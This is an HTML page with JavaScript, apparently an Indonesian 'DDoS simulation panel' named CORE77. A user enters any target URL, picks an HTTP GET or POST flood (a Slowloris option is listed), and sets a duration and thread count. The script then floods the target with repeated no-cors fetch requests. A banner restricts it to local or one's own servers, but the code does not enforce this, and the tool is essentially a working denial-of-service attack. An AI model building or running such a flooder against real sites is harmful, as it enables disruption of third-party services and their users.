<!DOCTYPE html>
<html>
<head>
    <title>CORE77 - DDoS SIMULATION PANEL</title>
    <style>
        body {
            background-color: #111;
            color: #0f0;
            font-family: 'Courier New', monospace;
            padding: 20px;
        }
        .container {
            max-width: 800px;
            margin: auto;
            border: 2px solid #0f0;
            padding: 20px;
            border-radius: 10px;
        }
        h1 {
            text-align: center;
            color: #ff0000;
        }
        label {
            display: block;
            margin-top: 15px;
        }
        input, select, button {
            width: 100%;
            padding: 10px;
            margin-top: 5px;
            background: #222;
            color: #0f0;
            border: 1px solid #0f0;
            border-radius: 5px;
        }
        button {
            background: #ff0000;
            color: white;
            font-weight: bold;
            cursor: pointer;
        }
        button:disabled {
            background: #444;
            cursor: not-allowed;
        }
        .log {
            background: #000;
            height: 200px;
            overflow-y: scroll;
            padding: 10px;
            margin-top: 20px;
            border: 1px solid #0f0;
            white-space: pre-wrap;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üõ†Ô∏è CORE77 - DDoS SIMULATION PANEL</h1>
        <p><strong>‚ö†Ô∏è HANYA UNTUK TESTING LOKAL / SERVER SENDIRI ‚ö†Ô∏è</strong></p>
        
        <label>üîó Target URL (contoh: http://target.com):</label>
        <input type="text" id="url" placeholder="http://localhost/test">
        
        <label>‚öîÔ∏è Metode Serangan:</label>
        <select id="method">
            <option value="http">HTTP Flood (GET Request)</option>
            <option value="post">HTTP Post Flood</option>
            <option value="slow">Slowloris Simulation</option>
        </select>
        
        <label>‚è±Ô∏è Durasi (detik):</label>
        <input type="number" id="seconds" value="10" min="1" max="60">
        
        <label>üßµ Thread/Jumlah Request per Detik:</label>
        <input type="number" id="threads" value="50" min="1" max="500">
        
        <button id="startBtn" onclick="startAttack()">üöÄ START DDoS SIMULATION</button>
        <button id="stopBtn" onclick="stopAttack()" disabled>‚õî STOP ATTACK</button>
        
        <h3>üìú Attack Log:</h3>
        <div class="log" id="log">[System] Ready. Masukkan target dan mulai simulasi.</div>
    </div>

    <script>
        let attackActive = false;
        let controllers = [];
        
        function log(msg) {
            const logDiv = document.getElementById('log');
            logDiv.innerHTML += `\n[${new Date().toLocaleTimeString()}] ${msg}`;
            logDiv.scrollTop = logDiv.scrollHeight;
        }
        
        async function floodRequest(url, method) {
            try {
                const controller = new AbortController();
                controllers.push(controller);
                
                const options = {
                    method: method === 'post' ? 'POST' : 'GET',
                    mode: 'no-cors',
                    signal: controller.signal
                };
                
                await fetch(url, options);
                log(`‚úÖ Request sent to ${url}`);
            } catch (err) {
                log(`‚ùå Request failed: ${err.message}`);
            }
        }
        
        function startAttack() {
            const url = document.getElementById('url').value;
            const method = document.getElementById('method').value;
            const seconds = parseInt(document.getElementById('seconds').value);
            const threads = parseInt(document.getElementById('threads').value);
            
            if (!url) {
                alert('Masukkan URL target!');
                return;
            }
            
            attackActive = true;
            document.getElementById('startBtn').disabled = true;
            document.getElementById('stopBtn').disabled = false;
            controllers = [];
            
            log(`üî• ATTACK STARTED to ${url} | Method: ${method} | Duration: ${seconds}s | Threads: ${threads}`);
            
            // Multi-thread simulation
            for (let i = 0; i < threads; i++) {
                const intervalId = setInterval(() => {
                    if (!attackActive) {
                        clearInterval(intervalId);
                        return;
                    }
                    floodRequest(url, method);
                }, 100);
                
                // Auto stop setelah waktu tertentu
                setTimeout(() => {
                    clearInterval(intervalId);
                }, seconds * 1000);
            }
            
            // Auto stop
            setTimeout(() => {
                if (attackActive) {
                    stopAttack();
                    log(`‚è±Ô∏è Attack finished after ${seconds} seconds.`);
                }
            }, seconds * 1000);
        }
        
        function stopAttack() {
            attackActive = false;
            controllers.forEach(controller => controller.abort());
            document.getElementById('startBtn').disabled = false;
            document.getElementById('stopBtn').disabled = true;
            log('üõë ATTACK STOPPED manually.');
        }
    </script>
</body>
</html>
